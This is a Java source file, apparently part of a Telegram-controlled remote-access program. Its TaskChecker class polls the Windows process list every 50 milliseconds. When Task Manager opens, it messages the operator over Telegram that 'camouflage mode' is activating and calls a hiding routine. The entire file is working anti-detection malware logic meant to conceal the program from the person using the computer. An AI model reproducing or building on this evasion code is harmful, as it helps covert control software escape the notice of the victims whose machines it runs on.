package ProjectX;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class TaskChecker implements Runnable {
    boolean running = true;
    Bot telegramBotsApi;

    public TaskChecker(Bot bot){
        this.telegramBotsApi = bot;
    }
    @Override
    public void run() {
        while(running){
            try{
                String line;
                String pidInfo ="";

                Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"tasklist.exe");

                BufferedReader input =  new BufferedReader(new InputStreamReader(p.getInputStream()));

                while ((line = input.readLine()) != null) {
                    pidInfo+=line;
                }

                input.close();

                if(pidInfo.contains("Taskmgr.exe"))
                {
                    running = false;
                    telegramBotsApi.sendNachricht("Taskmanager wurde gestartet!\nTarnmodus wird aktiviert");
                    telegramBotsApi.tarnung();
                }
                Thread.sleep(50);
            }catch (Exception e){

            }
        }
    }
}
